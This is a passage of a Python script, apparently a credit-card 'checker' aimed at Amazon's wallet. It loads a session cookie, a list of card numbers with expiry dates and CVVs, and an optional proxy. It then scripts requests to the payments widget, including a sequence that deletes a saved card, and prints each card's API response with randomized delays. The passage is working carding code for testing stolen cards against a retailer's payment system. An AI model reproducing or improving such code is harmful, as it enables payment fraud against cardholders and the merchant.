        wii  = self.cap(html, 'widgetInstanceId":"', '"') or 'GjfJ82o8aZ5P'

        if not wst or not cust: return False

        #//! Find card
        ppw_iid   = ''
        iid_short = ''
        iid_m = re.findall(r'amzn1\.pm\.wallet\.[A-Za-z0-9_\-\.]+', html)
        if iid_m: ppw_iid = iid_m[0]
        iid_s = re.findall(r'0h_PU_CUS_[a-f0-9\-]+', html)
        if iid_s: iid_short = iid_s[0]
        is_def = 'true' if '"isDefault":"true"' in html or '"isDefault":true' in html else 'false'

        if not ppw_iid: return False

        #//! Widget AJAX headers
        whdr = {'User-Agent': ua, 'X-Requested-With': 'XMLHttpRequest','apx-widget-info': f'YA:Wallet/desktop/{wii}','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': f'https://www.{d}','Referer': f'https://www.{d}/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo','Accept': 'application/json, text/javascript, */*; q=0.01','widget-ajax-attempt-count': '0','sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin'}
        burl = f'https://www.{d}/payments-portal/data/widgets2/v1/customer/{cust}/continueWidget'

        #//! Step 1 —
        r1 = self.s.post(burl, headers=whdr, data=(
            f'ppw-jsEnabled=true&ppw-widgetState={wst}&ppw-widgetEvent=StartEditEvent'
            f'&ppw-iid={quote_plus(ppw_iid)}&ppw-paymentMethodType=Card'
            f'&ppw-isDefaultPaymentMethod={is_def}')).text
        wst2 = self.cap(r1, 'ppw-widgetState\\" value=\\"', '\\"')
        if not wst2: wst2 = self.cap(r1, 'ppw-widgetState\\\\" value=\\\\"', '\\\\"')
        if not wst2: return False

        if not iid_short:
            m = re.search(r'0h_PU_CUS_[a-f0-9\-]+', r1)
            if m: iid_short = m.group()
        if not iid_short: return False

        # Extract name + expiration from edit form
        e_name  = self.cap(r1, 'ppw-accountHolderName\\" value=\\"', '\\"') or 'Card Holder'
        e_month = ''
        mm = re.search(r'expirationDate_month.*?selected.*?value=.{0,3}(\d{1,2})', r1)
        if mm: e_month = mm.group(1)
        if not e_month: e_month = '12'
        e_year = ''
        my = re.search(r'expirationDate_year.*?selected.*?value=.{0,3}(\d{4})', r1)
        if my: e_year = my.group(1)
        if not e_year: e_year = '2029'

        #//! Step 2 — StartDeleteEvent
        ev = json.dumps({"iid": iid_short, "paymentMethodCode": "CC"}, separators=(',', ':'))
        r2 = self.s.post(burl + '?sif_profile=APX-Encrypt-All-NA', headers=whdr, data=(
            f'{quote_plus("ppw-widgetEvent:StartDeleteEvent:" + ev)}=Eliminar+de+wallet'
            f'&ppw-jsEnabled=true&ppw-widgetState={wst2}&ie=UTF-8'
            f'&ppw-accountHolderName={quote_plus(e_name)}'
            f'&ppw-expirationDate_month={e_month}&ppw-expirationDate_year={e_year}')).text
        wst3 = self.cap(r2, 'ppw-widgetState\\" value=\\"', '\\"')
        if not wst3: wst3 = self.cap(r2, 'ppw-widgetState\\\\" value=\\\\"', '\\\\"')
        if not wst3: return False

        #//! Step 3 — DeleteInstrumentEvent
        r3 = self.s.post(burl, headers=whdr, data=(
            f'ppw-jsEnabled=true&ppw-widgetState={wst3}&ie=UTF-8'
            f'&ppw-widgetEvent=DeleteInstrumentEvent'))
        return r3.status_code == 200


#//! --------------------------------- CLI  --------------------------------- !\\#
if __name__ == '__main__':
    HERE = os.path.dirname(os.path.abspath(__file__))

    ck_file = os.path.join(HERE, 'cookie.txt')
    if not os.path.exists(ck_file): print('cookie.txt not found'); sys.exit(1)
    with open(ck_file, 'r', encoding='utf-8') as f: COOKIE = f.read().strip()
    if not COOKIE: print('cookie.txt is empty'); sys.exit(1)

    cc_file = os.path.join(HERE, 'cards.txt')
    if not os.path.exists(cc_file):
        with open(cc_file, 'w') as f: f.write('# num|mm|yy|cvv\n')
        print('cards.txt created, add cards and retry'); sys.exit(0)
    with open(cc_file, 'r', encoding='utf-8') as f:
        CARDS = [ln.strip() for ln in f if ln.strip() and not ln.strip().startswith('#') and '|' in ln]
    if not CARDS: print('No valid cards in cards.txt'); sys.exit(1)

    px_file = os.path.join(HERE, 'proxy.txt')
    PROXY   = None
    if os.path.exists(px_file):
        with open(px_file, 'r', encoding='utf-8') as f: p = f.read().strip()
        if p and not p.startswith('#'): PROXY = p

    for i, card in enumerate(CARDS, 1):
        g  = AmazonGate(COOKIE, PROXY)
        ri = g.init()
        if not ri['ok']:
            print(json.dumps({'CC': card, 'ApiResp': ri['msg'], 'T/Tkn': '0s'}, ensure_ascii=False))
            continue

        t1  = time.time()
        res = g.process(card)
        dt  = round(time.time() - t1, 2)

        api_resp = res.get('apiResponse') or res.get('response') or res.get('message', '?')
        print(json.dumps({'CC': card, 'ApiResp': api_resp, 'T/Tkn': f'{dt}s'}, ensure_ascii=False))
        sys.stdout.flush()

        if i < len(CARDS):
            time.sleep(random.uniform(1, 3))
